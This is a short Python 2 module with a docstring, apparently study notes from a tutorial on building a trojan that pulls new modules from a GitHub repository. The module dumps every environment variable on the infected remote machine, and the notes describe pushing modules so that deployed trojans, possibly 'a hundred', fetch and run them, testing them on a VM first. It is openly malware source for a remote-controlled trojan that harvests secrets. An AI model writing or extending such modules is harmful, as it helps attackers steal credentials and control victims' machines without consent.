"""
Retrieves any environment variables that are set on the remote machine on which the trojan is executing.

Now, push both of these files to GITHUB reposo that it is useable by our trojan. From the command line:
- git add .
- git commit -m "Adding new modules"
- git push origin master

You should then see your code getting pushed to your GitHub repo. This is how you can continue to develop code in the
future.

Learn integration of more comples modules on my own.
Should you have a hundred deployed trojans, you can push new modules to your GitHub repo and QA them by enabling
yur new module in a config file for your local version of the trojan. This way you can test on  a VM or host hardware
that you control before allowing one of your remote trojans to pick the code and use it.
"""

import os

def run(**args):
    print "[*] In environment module."
    return str(os.environ)
